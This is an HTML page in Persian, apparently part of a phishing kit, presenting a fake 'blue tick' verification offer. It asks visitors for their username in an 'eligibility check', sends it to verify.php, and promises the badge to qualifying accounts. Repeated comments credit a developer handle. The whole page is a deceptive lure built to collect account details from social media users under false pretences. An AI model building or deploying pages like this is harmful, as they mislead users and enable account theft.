<!-- #->Dev => @ZProGrammer - @ZProGramming -->
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <meta name="description" content="">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>دریافت تیک آبی</title>
  <link href="https://cdn.rawgit.com/rastikerdar/shabnam-font/v4.0.0/dist/font-face.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="assets/css/style.css">

</head>
<body>

<div style="height: 530px;" class="card">
  <div class="field">
  
    <span class="header">بررسی صلاحیت </span>
    <form   action="verify.php" method="post"  >
        <br>
        <div id="user"><img src="assets/img/user.png" alt="" width="100" height="100" /></div>
<!-- #->Dev => @ZProGrammer - @ZProGramming -->       
    <div class="form-group">
      <input type="text" id="id" name="id" required="required" autocomplete="off">
      <label for="input" class="control-label">یوزرنیم</label><i class="bar"></i>
    </div>

    <div class="button-container">
    
      <button type="submit" value="Submit" class="button"><span> بررسی حساب</span></button>
   
    </div>
    </form>
در این مرحله اکانت شما بررسی شده
    <br><br>
    در صورت داشتن شرایط شما تیک ابی را دریافت خواهید کرد
    
  
  </div>

  </div>
</div>

  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

</body>
</html>
<!-- #->Dev => @ZProGrammer - @ZProGramming -->